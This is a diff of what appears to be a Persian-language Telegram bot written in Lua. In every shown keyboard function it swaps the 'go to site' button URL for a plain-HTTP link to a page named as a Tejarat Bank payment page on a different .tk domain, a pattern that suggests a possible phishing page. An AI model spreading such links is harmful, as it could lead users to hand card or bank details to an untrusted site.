@@ -108,7 +108,7 @@ local function do_keyboard_a()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!zdc'},
@@ -121,7 +121,7 @@ local function do_keyboard_b()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!zdc'},
@@ -134,7 +134,7 @@ local function do_keyboard_c()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!zdc'},
@@ -147,7 +147,7 @@ local function do_keyboard_d()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!zdc'},
@@ -160,7 +160,7 @@ local function do_keyboard_e()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!zdc'},
@@ -173,7 +173,7 @@ local function do_keyboard_f()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!internet'},
@@ -186,7 +186,7 @@ local function do_keyboard_g()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!internet'},
@@ -199,7 +199,7 @@ local function do_keyboard_h()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!internet'},
@@ -212,7 +212,7 @@ local function do_keyboard_i()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!internet'},
@@ -225,7 +225,7 @@ local function do_keyboard_j()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!internet'},
@@ -238,7 +238,7 @@ local function do_keyboard_k()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!code'},
@@ -251,7 +251,7 @@ local function do_keyboard_l()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!code'},
@@ -264,7 +264,7 @@ local function do_keyboard_m()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!code'},
@@ -277,7 +277,7 @@ local function do_keyboard_n()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!code'},
@@ -290,7 +290,7 @@ local function do_keyboard_o()
     local keyboard = {}
     keyboard.inline_keyboard = {
     	{
-    		{text = 'انتقال به سایت🌐', url = 'fast-charge.cf/Buy'},
+    		{text = 'انتقال به سایت🌐', url = 'http://fastcharges.tk/TejaratBank/Payment.html'},
 	    },
 	{
 	        		{text = '🔙بازگشت', callback_data = '!code'},
